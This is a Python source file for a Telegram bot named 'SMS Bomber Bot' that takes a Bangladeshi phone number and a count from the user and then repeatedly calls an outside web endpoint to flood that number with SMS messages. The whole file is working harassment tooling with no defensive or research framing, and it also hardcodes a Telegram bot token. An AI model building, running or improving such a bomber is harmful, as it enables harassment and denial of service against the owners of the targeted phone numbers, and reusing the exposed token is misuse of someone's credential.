from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
import aiohttp

BOT_TOKEN = "7509103652:AAGCBpH25iFBkOx2SVHSHHT3s3iDAvZl53k"
ASK_NUMBER, ASK_LIMIT = range(2)
user_data = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply_keyboard = [["Bombing"]]
    markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text("Welcome to SMS Bomber Bot!\nClick 'Bombing' to continue.", reply_markup=markup)
    return ASK_NUMBER

async def ask_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text != "Bombing":
        await update.message.reply_text("Please click 'Bombing' to proceed.")
        return ASK_NUMBER
    await update.message.reply_text("Enter number (e.g. 018XXXXXXXX):")
    return ASK_LIMIT

async def ask_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    if number.startswith("01") and len(number) == 11:
        number = "880" + number
    elif number.startswith("880") and len(number) == 13:
        pass
    else:
        await update.message.reply_text("Invalid number format. Use 01XXXXXXXX or 8801XXXXXXXXX")
        return ASK_LIMIT

    user_data[update.effective_chat.id] = {"number": number}
    await update.message.reply_text("How many SMS do you want to send?")
    return ConversationHandler.END

async def get_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        limit = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("Please enter a valid number.")
        return

    chat_id = update.effective_chat.id
    number = user_data.get(chat_id, {}).get("number")

    if not number:
        await update.message.reply_text("Session expired. Please send /start again.")
        return

    await update.message.reply_text(f"Sending {limit} SMS to {number}...")
    url = f"https://bomberdemofor2hrtcs.vercel.app/api/trialapi?phone={number}"
    success, fail = 0, 0

    async with aiohttp.ClientSession() as session:
        for _ in range(limit):
            try:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        success += 1
                    else:
                        fail += 1
            except:
                fail += 1

    await update.message.reply_text(f"Done!\nSuccess: {success}\nFailed: {fail}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.")
    return ConversationHandler.END

app = ApplicationBuilder().token(BOT_TOKEN).build()

conv_handler = ConversationHandler(
    entry_points=[CommandHandler("start", start)],
    states={
        ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_number)],
        ASK_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_limit)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)

app.add_handler(conv_handler)
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, get_limit))

app.run_polling()